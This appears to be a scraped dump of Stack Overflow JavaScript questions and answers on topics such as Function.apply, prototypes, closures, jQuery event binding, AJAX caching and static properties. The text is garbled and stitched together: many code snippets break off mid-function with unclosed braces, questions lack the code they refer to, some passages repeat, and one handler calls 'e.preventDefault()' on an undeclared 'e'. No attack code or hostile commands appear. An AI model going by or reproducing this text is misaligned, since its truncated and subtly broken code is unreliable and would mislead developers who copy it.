<p>The apply function will execute:</p>

<pre><code>Math.min(1,2,3,4);
</code></pre>

<p>Note that the first parameter, the context, is not important for these functions since they are static, they will work regardless of what is passed as the context.</p>

","5445","","<p>The primordial differrence is that in your first example, without prototype, the <code>getSecret</code> and <code>setSecret</code> function implementation will reside on <em>every</em> instance of spy1.</p>

<p>On your second example, the functions are defined on the prototype, and all instances refer to them directly, you can test it:</p>

<pre><code>var bond = new spy1(""007""),
    bond2 = new spy1(""007"");

bond.getSecret === bond2.getSecret; // &lt;-- false since they are two functions

<p>Also note what @T.J. commented, in your second example, using the prototype, you don't have access to the constructor function closure, and for that you are making a <code>window.secret</code> global variable.</p>

<p>If you intend to work with <a href=""http://www.crockford.com/javascript/private.html"">privileged methods</a>, extending the prototype is not an option, all the methods that need access to the variables defined within the scope of the constructor function need to be declared inside of it...</p>

<p>See also: <a href=""http://www.javascriptkit.com/javatutors/closures.shtml"">Closures</a>.</p>
"
"<p>For example, compare these two:</p>

<pre><code>function Person(name) {

var john = new Person('John');
console.log(john.constructor);

var MyJSLib = {
 Person : function (name) {
   this.name = name;
 }
}
var john2 = new MyJSLib.Person('John');

<p>The first form is useful for debugging at runtime. The 2nd form requires some extra steps to figure out what kind of object you have.</p>

<p>I know that I could write a descriptive toString function or call the toSource method on the constructor to get some more information, but I want the simplest way possible.</p>

<p>Is there a way to do this? Suggestions?</p>
","5445","","<p>Well that happens because you are using an anonymous function.</p>

<p>You can specify names of anonymous functions (yes, it sounds odd), you could:</p>

<pre><code>var MyJSLib = {
 Person : function Person (name) {
   this.name = name;
 }
}
var john2 = new MyJSLib.Person('John');
console.log(john2.constructor);
</code></pre>

<p>Anonymous functions can be named but those names are only visible
within the functions themselves, and since you use the new operator, the constructor property will be set, and you will be able to see the name.</p>

<p>You could also compare the constructor reference using or not a name for the function:</p>

<pre><code>console.log(john2.constructor === MyJSLib.Person); // true

"<p>Basically, my question is about how Javascript handles regex literals.</p>

<p>Contrasting with number, string and boolean where literals are primitive data types and corresponding Number, String and Boolean objects exist with seamless type conversion, are regex literals anonymous instances of the RegExp object or is this a case of regex being treated like primitive data with seamless type conversion to RegExp?</p>

<p>""The complete Reference Javascript, 2nd edition, Powell and Schneider (MH)"" contradicts itself - at one place the authors say that /regex/ is automatically typecasted into RegExp when needed and at another place they say that /regex/ is nothing but an instance of RegExp!</p>

<p>EDIT: Please provide a reference to a reliable source</p>
","5445","","<p>Yes, the following two expressions are equivalent:</p>

<pre><code>var r1 = /ab+c/i,
    r2 =new RegExp(""ab+c"", ""i"");
</code></pre>

<p>The constructor property of both points to the <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Global%5FObjects/RegExp"" rel=""nofollow"">RegExp</a> constructor function:</p>

<pre><code>(/ab+c/i).constructor === RegExp // true
r2.constructor === RegExp // true
</code></pre>

<p>And a regexp literal is an instance of RegExp:</p>

<pre><code> /ab+c/i instanceof RegExp // true
</code></pre>

<p>The basic difference is that defining regular expressions using the constructor function allows you to build and compile an expression from a string. This can be very useful for constructing complex expressions that will be re-used.</p>

"<p>I have found I can do the following:</p>

Is there a way to find out of the frame exists?  Specifically I am looking to see if parent.frames['header'].document is there.</p>

<p>Is there a reliable way of doing this?</p>

<p>Update:
Here's my frameset code:</p>

The downside is that, in some cases, main is replaced with another frameset.</p>
","5445","","<p>If you want to know if an element exists, you have to check the length property, see the <a href=""http://docs.jquery.com/Frequently%5FAsked%5FQuestions#How%5Fdo%5FI%5Ftest%5Fwhether%5Fan%5Felement%5Fexists.3F"" rel=""nofollow"">jQuery FAQ</a>:</p>

<pre><code>if ($('#myFrame').length) {
  alert('#myFrame exists');
}
</code></pre>

<p>In your case I think you want to :</p>

<pre><code>if ($('frame[name=header]', parent).length) {
  alert('frame exists');
}
</code></pre>

<p>Why check the length property?</p>

<p>Because if you pass a selector to jQuery that doesn't match anything, the returned result is a jQuery object, is not a falsy value (null, undefined, 0 or false), in an <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Statements/if...else"" rel=""nofollow"">if statement</a> the condition is evaluated to bool, and a non 'falsy' value is evaluated always to true:</p>

<pre><code>if ($('#nonExisting')) {
  alert('always true');
}

// because 
!!$('#nonExisting') == true;  // and
!!'hello' == true;
!!0 == false;
</code></pre>

<p>I used <code>!!</code> as an example of a simple way of turning any expression into its boolean equivalent, what the if statement does behind the scenes...</p>

<p><strong>Edit:</strong> Looking at your frameset markup, and assuming that you want to check if the header frame exists from the main page, you can easily do it by :</p>

<pre><code> if (parent.header !== undefined) {
   // frame exists
 }

<p>can I have the call_this function in the onclick line itself?</p>

<p>Now I have the code like this. Inside the onclick event, the value is stored in the $selectedId correctly. But When I try to pass that value in the url, I do not get the correct value. The last value in the for loop is passed.</p>

<p>here the id is passed as 4,which is the last value in the php for loop.  </p>
","5445","","<p>Since you have an ID on your anchor element, you can easily find it and bind the event.</p>

<p>If it's a simple action, you can use an anonymous function rather than having to declare a function on the global scope:</p>

<pre><code>window.onload = function () {

  // Bind events...

  document.getElementById('ctr').onclick = function () {
    flag1 = 1;
    return false; // stop the browser from following the link
  };

  // ....
};
</code></pre>

<p><strong>Edit:</strong> Looking at your edit, the jQuery document.ready event fires when the page load, at this time you flag still have <code>null</code> assigned.</p>

<p>Note that you are only adding the anchor element to the DOM, and then you make an if statement.</p>

<p>Since you use jQuery you can use it to bind the <a href=""http://docs.jquery.com/Events/click"" rel=""nofollow"">click</a> event to the newly created element:</p>

<pre><code>var flag=null;

$(document).ready(function(){
  $('&lt;a id=""ctr"" href=""#""&gt; Hello &lt;/a&gt;').appendTo('#header').click(function () {
    flag = 1; 
    e.preventDefault(); // stop the browser from following the link
  });
});
</code></pre>

<p>You can do this since the <a href=""http://docs.jquery.com/Manipulation/appendTo"" rel=""nofollow"">appendTo</a> function returns the newly created DOM element, and you can bind events directly to it.</p>

"<p>In my project in one of the page I am creating a checkbox and doing some server side task when the checkbox check changes. What I want is to show a confirm message before going to the code behind.</p>

<p>If I am calling the javascript function then it is returning true/false(onclick event) but not going inside CheckboxCheckChanged.</p>

<p>I want the confirmation message should appear and depending upon the user input it will go inside the CheckboxCheckChanged event in code behind</p>
","5445","","<p>I've found this problem a couple of times, when using ASP:CheckBoxes with the AutoPostBack property set to true.</p>

<p>If that property is true, ASP .NET creates an <em>ugly</em> inline onclick event on the generated HTML as this:</p>

<pre><code>&lt;input id=""CheckBox1"" type=""checkbox"" name=""CheckBox1"" 
 onclick=""javascript:setTimeout('__doPostBack(\'CheckBox1\',\'\')', 0)"" /&gt;
</code></pre>

<p>So if you set again the onclick event, it will be overriden, and the PostBack won't occur.</p>

<p>I found a workaround to this, is basically to store the original onclick event that ASP .NET generates, and assign a new onclick function, which will show the confirmation, and if the user selects cancel it will return false, otherwise the original click event will be executed normally with the right context and event object, and the postback will occur, for example:</p>

<pre><code>window.onload = function() {
  var checkBox1 = document.getElementById('&lt;%=CheckBox1.ClientID %&gt;'),
      originalOnClick = checkBox1.onclick; // store original click event

  checkBox1.onclick = function(e) {
    if (confirm('Are you sure?')) {
      originalOnClick.call(this, e); // call the original click with the right
                                     // context and event object
    } else {
      return false;  // cancel the click
    }
  };

"<p>First my code</p>

   if (result.result == true)
      $(""#pst"" + postId + "" &gt; .pstside &gt; .rank &gt; .score"").html(result.voteCount);
 });
</code></pre>

<p>I have a bunch of buttons each with code which brings some voting results from an ASP.Net MVC controller action.</p>

<p>This works well the first time the button is clicked, but if it is clicked again nothing happens. Nothing reaches the server.</p>

<p>I am testing on FireFox.</p>

<p>What is going wrong? Some kind of weird caching? Because the request never reaches my controller the second time, the javascript seems to execute okay but keeps returning the old values.</p>
","5445","","<p>Sounds like a browser cache issue (if is that I'm pretty sure that is happening with IE), you may want to use <a href=""http://docs.jquery.com/Ajax/jQuery.ajax#options"">$.ajax</a> and set the cache option to false, since it is false by default only for dataType <code>script</code> and <code>jsonp</code>:</p>

<pre><code>$.ajax({
  type: ""GET"",
  url: ""./posts/vote/"" + postId + ""/1"",
  success: function (result) {
    if (result.result == true)
      $(""#pst"" + postId + "" &gt; .pstside &gt; .rank &gt; .score"").html(result.voteCount);
  },
  dataType: ""json"",
  cache: false
});
</code></pre>

<p>Or you could set that option globally, for all the jQuery Ajax functions, using <a href=""http://docs.jquery.com/Ajax/jQuery.ajaxSetup"">$.ajaxSetup</a> before using $.getJSON:</p>

<pre><code>$.ajaxSetup({ cache: false });
</code></pre>

<p><strong>Edit:</strong> You can do a POST request returning JSON like this:</p>

<pre><code>$.post(""./posts/vote/"" + postId + ""/1"", 
  function (result) {
    if (result.result == true)
      $(""#pst"" + postId + "" &gt; .pstside &gt; .rank &gt; .score"").html(result.voteCount);
  }, ""json"");
</code></pre>

<p>If you plan to do a lot of <em>postJSON</em> request, you can make your own function:</p>

<pre><code>jQuery.postJSON = function(url, data, callback) {
    jQuery.post(url, data, callback, ""json"") ;
};

<p>Why does it terminate everything that follows? I I thought it wouldnt if you had it inside <code>&lt;head&gt;</code>. I dont like having it in the bottom (after /html). Whats the problem?</p>
","5445","","<p>That happens because the alert executes immediately when the head it's parsed, <a href=""https://developer.mozilla.org/en/DOM/window.alert"" rel=""nofollow"">alert</a> blocks parsing, so the content of the body haven't yet been loaded.</p>

<p>Execute your alert when the window has been loaded (<a href=""https://developer.mozilla.org/en/DOM/window.onload"" rel=""nofollow"">window.onload</a> event):</p>

<pre><code>window.onload = function () {

"<p>I am developing Dnn modules and I am using jQuery in some modules, I add the jQuery reference to the top of the each ascx file, by the way when user add multiple modules to the page it references every time when modules are added, this situation gives some errors, when I remove the reference from the module which is bottom of the other module which both use jQuery, they work good, is there a way to prevent multiple reference the jQuery ? I mean if it is referenced on the page befeore it won't reference again.Thanks.</p>
","5445","","<p>You could make small script to check if jQuery is present on the page, and only if is not present, load it:</p>

<pre><code>// 'load-jquery.js'
window.onload = function () {
  if (window.jQuery === undefined) {
    var script = document.createElement('script');
    script.src = 'path/to/jquery.min.js';
    document.getElementsByTagName('head')[0].appendChild(script); // load jQuery
  }
};

"<p>I'm having a problem with submitting a form and Javascript confirmation. Basically, the following Javascript is called when the ""submit"" button is pressed.</p>

<pre><code>function confirmation() {
    var answer = confirm(""Are you sure you wish to edit?"")
    if (answer)
    {
    	window.location = ""#editform2"";
    }
}
</code></pre>

<p>However, when I hit the cancel instead of ok, the Javascript executes correctly, because I watch the address bar and it doesn't update to #editform2. The form, however, still submits. It seems to refresh the page. Here's the relevant parts from the form:</p>

<pre><code>//Form is encoded in PHP
&lt;form method=\""post\""&gt;
//Form is in here
&lt;input type=\""submit\"" value=\""Edit\"" onclick=\""confirmation()\""&gt;
</code></pre>

<p>So the form doesn't know where it's going, it just refreshes the page, and the page happens to be the processor as well. So it's processing even though I clicked cancel and the Javascript should keep it on the same page. Besides moving the processing to a different page, what are my solutions?</p>
","5445","","<p>Don't use the onclick event of the submit button, use the onsubmit event of your form:</p>

<pre><code>document.forms[0].onsubmit = function () {
    return confirm(""Are you sure you wish to edit?"");
}
</code></pre>

<p>You may want to add a id attribute to your form to identify it.</p>

<p>Keeping event binding on JavaScript code; not on inline attributes on your HTML, makes your code more maintanable and easy to debug.</p>

"<p>I'm just learning JS, trying to do things without jQuery, and I want to make something similar to <a href=""https://developer.mozilla.org/samples/canvas-tutorial/3%5F2%5Fcanvas%5Fdrawimage.html"" rel=""nofollow"">this</a> however I want to use an array of images instead of just the one.</p>

<p>My image array is formed like this</p>

<pre><code>var image_array = new Array()
image_array[0] = ""image1.jpg"" 
image_array[1] = ""image2.jpg""
</code></pre>

<p>And the canvas element is written like this. (Pretty much entirely taken from the Mozilla site)</p>

      var ctx = document.getElementById('canvas').getContext('2d');

          }
        }
      }
    }
</code></pre>

<p>It uses the image ""sample.png"" in that code but I want to change it to display an image from the array. Displaying a different one each time it loops.</p>

<p>Apoligies if I've not explained this well.</p>
","5445","","<p>Just iterate over the array, and position the images by using its width and height properties:</p>

<pre><code>function draw() {  
  var ctx = document.getElementById('canvas').getContext('2d'),  
      img, i, image_array = [];  

  image_array.push(""http://sstatic.net/so/img/logo.png"");   
  image_array.push(""http://www.google.com/intl/en_ALL/images/logo.gif"");  
  // ...  

  for (i = 0; i &lt; image_array.length; i++) {  
    img = new Image();  
    img.src = image_array[i];  
    img.onload = (function(img, i){ // temporary closure to store loop 
      return function () {          // variables reference 
        ctx.drawImage(img,i*img.width,i*img.height);

<p>So is there any way to measure the difference between the mouse button gets depressed and when it gets released?</p>
","5445","","<p>You could create a closure to share two variables, one to store the start time and other for the end time, then in the mouseup event, get the difference:</p>

"<p>I have an AJAX-based website using JavaScript on the client.  Certain operations on the site cache large result sets from service calls in the browser (i.e. hundreds of megabytes).  These are throw-away results.  They will be viewed for a short time and then need to be cleared from memory.  </p>

<p>I've written a small test site that loads a bunch of junk in memory and then calls JavaScript's <code>delete</code> method.  This works great in Firefox (memory almost instantly gets returned).  Internet Explorer 8 (haven't tried 7) doesn't free the memory until the page is refreshed or closed.  </p>

<p>Does anyone know how to drop IE's memory usage using JavaScript/Ajax (no page refreshes)?</p>

<p>Below is my sample client code:</p>

<pre><code>function load() {
 var x = ['dfjasdlfkjsa;dflkjsad;flkjsadf;lj'];

 for( var i = 0; i &lt; 10000000; ++i ) {
  x.push('asdfasfasfsfasdfkasjfslafkjslfjsalfjsaldfkjasl;dfkjsadfl;kjsdflskajflskfjslakfjaslfkjsaldfkjsaldfksdfjk');
 }

 alert('deleting');   // &lt;--- memory usage around 500mb
 delete x;            // &lt;--- immediate results in Firefox 3.5 (not IE8)
 alert('done');
}
</code></pre>

<p><strong>UPDATE:</strong> Setting the variable to 'null' does not immediately clear the memory (as that is left up to the garbage collector).  Also, setting a variable null only gets a single reference where there might be multiple references.</p>
","5445","","<p>Just assign null to the variable:</p>

"<p>If I navigate away from a page in the middle of an $.ajax() request it fires the error callback.  I've tested in Safari and FF with both GET and POST requests.</p>

<p>One potential solution would be to abort all AJAX requests on page unload, but the error handler is called before unload, so this doesn't seem possible.</p>

<p>How do I do this?</p>

<p>--</p>

<p>(Also strange: When navigating away from a page, the error handler says that the textStatus parameter is ""error"", the same it throws when receiving a 500/bad request.)</p>
","5445","","<p>In the error callback or <a href=""http://docs.jquery.com/Ajax/jQuery.ajax"">$.ajax</a> you have three input arguments:</p>

<pre><code>function (XMLHttpRequest, textStatus, errorThrown) {

}
</code></pre>

<p>You can check directly the <code>xhr.status</code> to get the HTTP response code, for example:</p>

<pre><code>$.ajax({
  url: ""test.html"",
  cache: false,
  success: function(html){
    $(""#results"").append(html);

  error: function (xhr, textStatus) {

To tell the difference between a connection broken by the browser and the case where the server is down (jasonmerino's comment):</p>

  <p>On unload the xhr.readyState should be 0, where for a non responsive

"<p>I have a web page that uses three controls to allow a user to specify a date: 2 drop down controls for month and day (where Jan = 1, perhaps a bad choice :-)) and the days of the month (1-31). A text box is used for the year. In the Year text box, I use an AJAX Toolkit Watermark extender found [here][1] to write the literal word ""Year"" in light grey in the text box. This text disappears when the user sets focus to the text box. If the user enters something in the text box, the text appears in the normal textbox color, else the light grey text ""Year"" re-appears when the textbox loses focus.</p>

<p>3 control make up a ""Date Issued"" text box and similarly, 3 more control make up a ""Expiration Date"" set of controls.</p>

<p>When a user changes the Issue date (for example, the focus of the last control, Issued Year, is lost, I'd like to update the Expiration Date controls to a date value that is 10 years from the Issue date.</p>

Why does  the dtmDateOfIssue.getYear() function return a two-digit year if the year is &lt;2000 and itherwise return a 4-digit year if the year is > 2000?

    &lt;asp:DropDownList ID=""ddlDate"" runat=""server""&gt;
    &lt;/asp:DropDownList&gt;
    &lt;asp:TextBox ID=""txtYear"" runat=""server"" Width=""85px"" &gt;&lt;/asp:TextBox&gt;            
    &lt;asp:CustomValidator ID=""CustomValidator1"" runat=""server""

        ValidateEmptyText=""True""&gt;&lt;/asp:CustomValidator&gt;
</code></pre>

<p>This is sent to the browser as the following. Note that the event handler that I am writing Javascript for uses the client side IDs because the client sided script is page-specific. Not sure if that will be clear or will make sense to you. I would prefer an example using the final client side names, but if you again want to offer the &lt;%- servercontrol.ClientId %> approach too, I would be willing to give it a try.</p>

"<p>I'm trying to remove a class attribute from an element and add the class to another element. 
I successfully removed the class but having problem in appending the class to the other element.</p>

    $('#tabber_module #myForms li').addClass(""selected"");

});

&lt;div class=""tabber_module"" id=""tabber_module""&gt;
     &lt;ul class=""horizontal_navigation child2""&gt;

         &lt;/li&gt;
     &lt;/ul&gt;
&lt;/div&gt;
</code></pre>

<p>The class ""selected"" is removed form the ""home"" li element but is not added to the ""myForms"" li element. </p>
","5445","","<p>You have id's on your LI elements, you only need to use the <a href=""http://docs.jquery.com/Selectors/id"" rel=""nofollow"">#id</a> selector:</p>

<pre><code>$('#viewAllMyForms').click(function(){
    $(""#tabber_module .selected"").removeClass(""selected"");
    $(""#myForms"").addClass(""selected"");
});
</code></pre>

<p><strong>Note:</strong> The id attribute of the DOM elements is supposed to be a unique identifier, you have duplicated the id of the LI and A elements, you should use an ID only once in a document.</p>

<p>I would rewrite your markup as this:</p>

<pre><code>&lt;div class=""tabber_module"" id=""tabber_module""&gt;
     &lt;ul class=""horizontal_navigation child2""&gt;
         &lt;li class=""first some_li selected"" id=""home""&gt; 
             &lt;a href=""#""&gt;Home&lt;/a&gt;
         &lt;/li&gt;
         &lt;li class=""some_li"" id=""notifications""&gt; 
             &lt;a href=""#""&gt;Notifications&lt;/a&gt;
         &lt;/li&gt;         
         &lt;li class=""some_li"" id=""myForms""&gt; 
             &lt;a href=""#""&gt;My Forms&lt;/a&gt;
         &lt;/li&gt;              
         &lt;li class=""some_li"" id=""reviewForms""&gt; 
             &lt;a href=""#""&gt;Forms For My Review&lt;/a&gt;
         &lt;/li&gt;
         &lt;li class=""some_li"" id=""otherForms""&gt; 
             &lt;a href=""#""&gt;Other Forms&lt;/a&gt;
         &lt;/li&gt;
     &lt;/ul&gt;
&lt;/div&gt;
</code></pre>

<p>Note that I removed the duplicated ID attribute from the anchor elements, but if you want to select an anchor you can without having an specific ID, for example:</p>

<pre><code>$('#notifications a') // selects the element &lt;a href=""#""&gt;Notifications&lt;/a&gt;

","5445","","<p>You can use the apply function, to call <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Global%5FObjects/Math/max"">Math.max</a>:</p>

<pre><code>var array = [267, 306, 108];
var largest = Math.max.apply(Math, array); // 306

<p>How it works?</p>

<p>The <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Global%5FObjects/Function/apply"">apply</a> function is used to call another function, with a given context and arguments, provided as an array.

<p>So if we call:</p>

<pre><code>Math.min.apply(Math, [1,2,3,4]);
</code></pre>

<p>The apply function will execute:</p>

<pre><code>Math.min(1,2,3,4);
</code></pre>

<p>Note that the first parameter, the context, is not important for these functions since they are static, they will work regardless of what is passed as the context.</p>

"<p>Hi Again Masters Of The Web :)
Now, I have got a new stupid question, and I am asking to forgive me. I read everywhere about this solution, but didn't find the one that works for me.</p>

<p>I have got:</p>

<pre><code>&lt;input name=""domain"" type=""text"" id=""domain"" onKeyUp=""javascript:chk_me();""&gt;
</code></pre>

<p>All I am asking is how to make this not to check after a button is pressed, but after to say 1000 miliseconds of keyboard inactivity?</p>
","5445","","<p>Another approach, without globals:</p>

<pre><code>var typewatch = function(){
    var timer = 0;
    return function(callback, ms){
        clearTimeout (timer);
        timer = setTimeout(callback, ms);
    }  
}();
</code></pre>

<p><strong>Usage:</strong></p>

<p>Attaching the event through JavaScript:</p>

<pre><code>window.onload = function () {
    document.getElementById('domain').onkeyup = function() {
        typewatch(function(){alert('Time elapsed!');}, 1000 );
    };
};
</code></pre>

<p>Or using an inline event handler (<em>not so much recommended</em>) as you have in your example:</p>

<pre><code>&lt;input type=""text"" name=""domain"" id=""domain""
   onKeyUp=""typewatch(function(){alert('Time elapsed!');}, 1000 );""/&gt;

"<p>I am using Ajax to change the innerHtml of a div by using onclick on a link. I need to call a javascript function after the file is retrieved from the server and replaces the content of the div. How can i do this?</p>

<p>The ajaxfunction function replaces the innerHtml of thisDiv with thisfile.php.</p>

<p>Thank you in advance!</p>
","5445","","<p>I think that the best way, assuming that your AJAX requests are asynchronous, is to add a callback parameter to your function, that will be executed when the request ends.</p>

<p>Since you don't mention any JavaScript library either posted your <code>ajaxfunction</code>, I suppose that you might be doing raw XHR requests, if so, you could for example:</p>

<pre><code>function ajaxfunction (url, elementId, callback) { 
  var xhr = new XMLHttpRequest();
  xhr.open(""GET"", url, true);
  xhr.onreadystatechange = function(){
    if ( xhr.readyState == 4 ) {
      if ( xhr.status == 200 ) {
        document.getElementById(elementId).innerHTML = xhr.responseText;
        callback(); // the content has been loaded to the DOM, executing callback
      } else {
        alert('error');
      }
    }
  };
  xhr.send(null);
}
</code></pre>

<p>And you could use the function like this (<em>note that I don't recommend at all the use inline JavaScript event binding on HTML</em>):</p>

<pre><code>&lt;a href=""this.php"" 
onclick=""ajaxfunction('thisfile.php','thisDiv', otherFn);return false;""&gt;link&lt;/a&gt;
</code></pre>

<p>The recommended way:</p>

<pre><code>&lt;a href=""this.php"" id=""linkId""&gt;link&lt;/a&gt;
</code></pre>

<p><hr /></p>

<pre><code>window.onload = function () {
  // Event binding...
  document.getElementById('linkId').onclick = function () {
    ajaxfunction('thisfile.php','thisDiv', function () {
      alert('Content retrieved, this is the callback!');
      return false;
    });
  };
  // .... 
};
</code></pre>

<p>For a more comprehensive example, post the code of your <code>ajaxfunction</code>.</p>
"
"<pre><code>var func = function()

    $(this).hide();

<p>I have my js logic which fills rooms and their products.</p>

<p>Now i want to send array of rooms to a webservice to do some calculations and get back from it the result.</p>

<p>How to send this array objects to the service and whats the data type which the service will receive to loop through and process?</p>

<p>I tried to write the javascript code like this:</p>

<pre><code>		$.ajax({
			type: ""POST"",
			contentType: ""application/json; charset=utf-8"",
			url: ""_Services/MyWebService.asmx/CalculatePrices"",
			data: ""{'rooms':'"" + roomsObjects + ""'}"",
			dataType: ""json"",
			success: function(result) {
				alert(result.d);
			}
		});
</code></pre>

<p>And the webservice like this:</p>

<pre><code>[WebMethod]
    public string CalculatePrices(object rooms)
    {
    	return ""blabla"";
    }
</code></pre>

<p>but i find that rooms in the wbservice is always = [object Object]</p>
","5445","","<p>For that case this would work:</p>

<pre><code>//...
   data : '{""rooms"":[' + roomsObjects.join() + ']}',
//...
</code></pre>

<p>The above code will generate a valid JSON string, but I recommend you to get a <a href=""https://github.com/douglascrockford/JSON-js/blob/master/json2.js"" rel=""nofollow"">JSON library</a> and use JSON.stringify function:</p>

<p>But if i have 3 orders with amounts 3, 1, and 5, then instead of <code>totalAmt</code> being 9, i get <code>0315</code>. So I think its adding the amounts together as strings instead of integars.</p>

<p>How do I fix this?</p>
","5445","","<p><code>order.amount</code> is a string, and if one of the operands of the + operator is a string, a concatenation is done instead of a sum.</p>

<p>You should convert it to number, for example using the unary plus operator:</p>

<pre><code>var totalAmt = 0, i, order; // declaring the loop variables
for (var i in orders) {
   order = orders[i];
   if (order.status !='Cancelled')
        totalAmt += +order.amount; // unary plus to convert to number
}

<p>You could alternatively use:</p>

<pre><code>totalAmt = totalAmt + (+order.amount);
totalAmt = totalAmt + Number(order.amount);
totalAmt = totalAmt + parseFloat(order.amount);
// etc...
</code></pre>

<p>Also you are using a <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Statements/for...in"" rel=""nofollow"">for..in</a> loop to iterate over <code>orders</code>, if <code>orders</code> is an array, you should use a normal for loop:</p>

<pre><code>for (var i = 0; i&lt;orders.length; i++) {
  //...
}
</code></pre>

<p>That is because the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Statements/for...in"" rel=""nofollow"">for...in</a> statement is intended to be used for iterate over <strong>object properties</strong>, for arrays it may be tempting to use it, because <em>seems</em> to work, but it's not recommended since it will iterate over the <em>object properties</em>, and if you have extended the Array.prototype, those properties will be also iterated in addition to the numeric indexes.</p>

<p>Another reason to avoid it is because the order of iteration used by this statement is <em>arbitrary</em>, and iterating over an array may not visit elements in numeric order, and also it seems to be much more <a href=""http://blogs.oracle.com/greimer/entry/best_way_to_code_a"" rel=""nofollow"">slower</a> than a simple for loop.</p>

"<p>While my page is loading content via XHR, if the user clicks the stop button or clicks to go to another page, the XHR error() function is called. This wouldn't normally be a big deal except for the user shock of seeing lots of (red) error messages on the page.</p>

<p>The messages are valid - there was indeed an error retrieving the content - but it's due to the user interaction, not because of a system failure.</p>

"<p>Is it possible to create multiple instances of an object in javascript such that they all are ready to be manipulated/edited at the same time? This relates to my earlier question here: <a href=""http://stackoverflow.com/questions/1428545/structure-of-orders-in-restaurant"">Structure of orders in restaurant</a>. What I am trying to do is keep each order object ready for editing until the customer is ready to pay/leave so that new items can be added to or existing items removed from them as desired - and it has to be possible for all order objects at the same time.</p>

","5445","","<p>Since you are using object literals on your <a href=""http://stackoverflow.com/questions/1428545/structure-of-orders-in-restaurant"">previous</a> question, I suggest you to give a look to this <a href=""http://javascript.crockford.com/prototypal.html"" rel=""nofollow"">prototypal inheritance</a> technique, it will allow you to easily create new object instances inheriting from a base instance, for example:</p>

<pre><code>// Helper function
if (typeof Object.create !== 'function') {
    Object.create = function (o) {
        function F() {}
        F.prototype = o;
        return new F();
    };
}

// ""Base"" order object
var order = {
    id: 0,
    table: 0,
    items: []
};

var orders = [], n = 10;
while (n--) {  // make 10 objects inheriting from order and add them to an array
  orders.push(Object.create(order)); 
}
</code></pre>

<p>Later on, you can access and manipulate your <code>order</code> objects in the <code>orders</code> array:</p>

<pre><code>orders[0].id = 10;
orders[0].table = 5;
orders[0].items.push({
  name: ""Beer"",
  quantity: 1,
  unit_price: 3
});

"<p>I have setup the following jQuery UI Dialog within my document.ready() section, i.e:</p>

<pre><code>        $(""#dialog"").dialog({

                    }
        }
    });

<p>1) My question is which I am unsure of, is that within my javascript code, I have a counter, which when it hits a particular value, would like my dialog window to appear.</p>

<p>Unsure how to achieve or trigger this?</p>

<p>Any ideas?</p>

<p>Thanks.</p>
","5445","","<p>1) If you want the dialog appear only when that condition is met, you should set the <code>autoOpen</code> option to <code>false</code>, later in your code, after you increment your counter variable, you should check its value and show it if the counter has the particular value you look for, i.e.:</p>

<pre><code>// ...
counter++;
if (counter == 100) {
  $('#dialog').dialog('open');
}
// ...

"<p>I've reading scope chain in Javascript but it didn't make any sense to me, could any one tell me what is scope chain and how it works with a graphic or something even an idiot can understand. I googled it but I didn't find something comprehensible :(</p>

<p>Thanks in advance.</p>
","5445","","<p>To understand the scope chain you must know how closures work.</p>

<p>A closure is formed when you nest functions, inner functions can refer to the variables present in their outer enclosing functions even after their parent functions have already executed.</p>

<p>JavaScript resolves identifiers within a particular context by traversing up the scope chain, moving from locally to globally.</p>

<p>Consider this example with three nested functions:</p>

<pre><code>var currentScope = 0; // global scope
(function () {
  var currentScope = 1, one = 'scope1';
  alert(currentScope);
  (function () {
    var currentScope = 2, two = 'scope2';

    (function () {
      var currentScope = 3, three = 'scope3';
      alert(currentScope);
      alert(one + two + three); // climb up the scope chain to get one and two

"<p>I have a popup div and want to hide it when users click outside of the div. Inside the div, I have a checkbox...</p>

<p>Problem is, the div's onblur event gets fired when trying to click on the checkbox. I put cancelEventBubble code on the onclick of the checkbox but the onblur fires before the checkbox onclick event...</p>

<p>any ideas or suggestions? This seems so simple to do but is not quite that simple...</p>

","5445","","<p>For most situations, you should avoid extending the native <code>Object.prototype</code>. When you extend it, <strong>ALL</strong> objects receive those new properties.</p>

"<p>How can I create static variables in Javascript?</p>
","5445","","<p>If you come from a class-based, strongly typed object-oriented language <em>(like Java, C++ or C#)</em> I assume that you are trying to create a variable or method associated to a ""type"" but not to an instance.</p>

<p>An example using a ""classical"" approach, with constructor functions maybe could help you to catch the concepts of basic OO JavaScript:</p>

<pre><code>function MyClass () { // constructor function
  var privateVariable = ""foo"";  // Private variable 

  this.publicVariable = ""bar"";  // Public variable 

  this.privilegedMethod = function () {  // Public Method
    alert(privateVariable);
  };
}

// Instance method will be available to all instance but only load once in memory 
MyClass.prototype.publicMethod = function () {    
  alert(this.publicVariable);
};

// Static variable shared by all instance 
MyClass.staticProperty = ""baz"";

//...
var myInstance = new MyClass();
</code></pre>

<p><code>staticProperty</code> is defined in the MyClass object (which is a function) and has nothing to do with its created instances, JavaScript treats functions as <a href=""http://en.wikipedia.org/wiki/First-class_function"">first-class objects</a>, so being an object, you can assign properties to a function.</p>

<p>At the time that the click event is executed, the handler refers to the last value that the <code>i</code> variable had, because that variable is stored on the closure.</p>

<p>As you noticed, by wrapping the click handler function in order to accept the <code>i</code> variable as an argument, and returning another function (basically create another closure) it works as you expect:</p>

<pre><code>for ( var i = 0; i &lt; 4; i++ ) {
  var a = document.createElement( ""a"" );

<p>This operator removes the element at the index you specify, but the array length is not affected, for example:</p>

<pre><code>var a = [1,2,3];

delete a[0];

console.log(a); // results in [undefined, 2, 3]
</code></pre>

<p>If you want to delete the elements and shift the indexes, you can use the <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Global%5FObjects/Array/splice"">splice</a> function:</p>

<pre><code>var a = [1,2,3];

a.splice(0,1);

console.log(a); // [2, 3]
</code></pre>

<p>You could implement a simple function to remove elements in a given index:</p>

<pre><code>Array.prototype.removeAt = function (index) {
  this.splice(index,1);
};

","5445","","<p>MooTools <em>heavily</em> <a href=""http://mootools.net/docs/core/Native/Array"" rel=""nofollow"">extends</a> the <code>Array.prototype</code>, and you are iterating your array with a <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Statements/for...in"" rel=""nofollow""><code>for...in</code></a> statement. </p>

